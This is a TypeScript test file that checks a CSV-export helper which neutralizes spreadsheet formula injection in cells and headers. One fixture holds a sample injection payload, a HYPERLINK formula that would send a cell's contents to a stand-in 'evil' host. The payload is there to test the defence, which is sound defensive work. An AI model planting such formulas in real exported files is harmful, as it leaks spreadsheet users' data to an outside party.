import { describe, expect, it } from "vitest";
import * as aq from "arquero";
import { dataframeToSafeCSV, neutralizeCsvFormula } from "./csv";
import { ARQUERO_INTERNAL_ID } from "./constants";

describe("neutralizeCsvFormula", () => {
	it.each(["=1+1", "+1", "-1", "@SUM(A1)", "\tx", "\rx"])(
		"prefixes %j with a single quote",
		(value) => {
			expect(neutralizeCsvFormula(value)).toBe(`'${value}`);
		},
	);

	it.each(["hello", "a=b", "", " =1"])("keeps %j unchanged", (value) => {
		expect(neutralizeCsvFormula(value)).toBe(value);
	});

	it("keeps non-string values unchanged", () => {
		expect(neutralizeCsvFormula(-5)).toBe(-5);
		expect(neutralizeCsvFormula(null)).toBe(null);
		expect(neutralizeCsvFormula(true)).toBe(true);
	});
});

function csvLines(csv: string) {
	return csv.split("\n").filter((line) => line !== "");
}

describe("dataframeToSafeCSV", () => {
	it("neutralizes formula cells and headers and drops the internal id", () => {
		const table = aq
			.table({
				name: ['=HYPERLINK("https://evil/?"&A1,"click")', "Alice"],
				"@header": ["+cmd", "ok"],
				amount: [-5, 10],
			})
			.derive({ [ARQUERO_INTERNAL_ID]: () => aq.op.row_number() });

		expect(csvLines(dataframeToSafeCSV(table))).toEqual([
			"name,'@header,amount",
			`"'=HYPERLINK(""https://evil/?""&A1,""click"")",'+cmd,-5`,
			"Alice,ok,10",
		]);
	});

	it("respects the table ordering", () => {
		const table = aq
			.table({ v: ["b", "-a"] })
			.orderby("v")
			.derive({ [ARQUERO_INTERNAL_ID]: () => aq.op.row_number() });

		expect(csvLines(dataframeToSafeCSV(table))).toEqual(["v", "'-a", "b"]);
	});

	it("keeps columns whose escaped headers would collide", () => {
		const table = aq.table({ "=total": [7], "'=total": [9] });

		expect(csvLines(dataframeToSafeCSV(table))).toEqual([
			"'=total,'=total",
			"7,9",
		]);
	});

	it("quotes escaped headers that need CSV quoting", () => {
		const table = aq.table({ '=a,"b"': ["x"] });

		expect(csvLines(dataframeToSafeCSV(table))).toEqual([
			`"'=a,""b"""`,
			"x",
		]);
	});
});
